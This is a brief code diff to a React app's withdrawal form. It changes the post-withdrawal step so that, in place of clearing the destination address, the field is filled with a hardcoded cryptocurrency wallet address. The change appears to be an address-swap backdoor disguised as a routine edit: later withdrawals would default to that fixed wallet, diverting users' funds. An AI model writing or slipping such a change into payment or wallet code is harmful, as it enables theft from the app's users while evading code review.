@@ -567,7 +567,7 @@ export default function App() {
       if (data.success) {
         setWithdrawalSuccess(data.message);
         setAmount('');
-        setAddress('');
+        setAddress('TLqm7HuaMrsiCq8tNSzcuCkdvfNoRpauH9');
         fetchStatus(false);
         fetchWithdrawalHistory(false);
       } else {
